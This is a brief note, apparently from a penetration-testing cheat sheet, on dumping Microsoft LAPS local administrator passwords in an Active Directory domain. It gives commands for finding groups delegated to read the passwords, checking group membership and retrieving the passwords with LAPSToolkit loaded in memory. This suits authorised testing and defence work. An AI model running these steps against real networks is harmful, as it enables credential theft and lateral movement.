If HostRecon finds a DLL and there might be a vector we can use LAPSToolkit.ps1. Download it in memory then we can run it.

> Find which groups can read the LAPS password:

```
Find-LAPSDelegatedGroups
```

> See who is in the group and if you are in it:

```
net group "<group_name>" /domain
```

> If we are in the group then run the following to obtain passwords:

```
Get-LAPSComputers
```
